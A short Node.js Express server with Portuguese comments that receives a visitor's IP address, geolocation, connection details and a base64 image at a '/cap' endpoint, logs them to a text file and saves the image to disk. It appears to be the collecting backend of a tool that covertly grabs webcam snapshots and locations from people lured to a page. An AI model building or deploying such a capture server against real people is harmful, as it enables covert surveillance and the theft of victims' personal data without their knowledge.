const express = require("express");
const fs = require("fs");
const path = require("path");
const requestIp = require("request-ip");

const app = express();
const PORT = 3000;

app.use(express.json({ limit: "10mb" }));
app.use(express.static("public"));

// Captura o IP real
app.post("/cap", (req, res) => {
  const ip = requestIp.getClientIp(req); // Captura o IP real
  const { image, location, connection } = req.body;

  // Log IP
  fs.appendFileSync("logs.txt", `IP: ${ip}\n`);

  // Log localização se disponível
  if (location) {
    fs.appendFileSync(
      "logs.txt",
      `Localização: Latitude ${location.latitude}, Longitude ${location.longitude}\n`
    );
  }

  // Log informações de conexão se disponíveis
  if (connection) {
    fs.appendFileSync(
      "logs.txt",
      `Conexão: Tipo ${connection.effectiveType}, Downlink ${connection.downlink}, RTT ${connection.rtt}\n`
    );
  }

  // Salvar imagem se disponível
  if (image) {
    const imageBuffer = Buffer.from(image.split(",")[1], "base64");
    fs.writeFileSync(
      path.join(__dirname, "img", `${Date.now()}.png`),
      imageBuffer
    );
  }

  res.send({ status: "success", ip });
});

app.listen(PORT, () =>
  console.log(`Servidor rodando em http://localhost:${PORT}`)
);
